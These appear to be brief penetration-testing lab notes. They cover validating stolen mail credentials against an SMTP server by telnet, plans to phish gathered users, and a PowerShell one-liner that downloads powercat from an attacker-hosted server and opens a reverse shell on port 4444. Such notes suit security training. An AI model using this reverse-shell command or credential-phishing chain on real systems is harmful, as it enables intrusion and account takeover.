- We have our list of users gathered from all the 245 - 249 machines so we have a chance to potentially phish someone using the maildmz creds we got from the 249 git repo.
- To authenticate to SMTP server to validate creds, I used the following commands:
	- telnet 192.168.x.189 25
	- EHLO maildmz@relia.com
	- AUTH LOGIN
	- base64 encoded username (maildmz)
	- base64 encoded password

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x:8000/powercat.ps1'); powercat -c 192.168.x.x -p 4444 -e powershell"
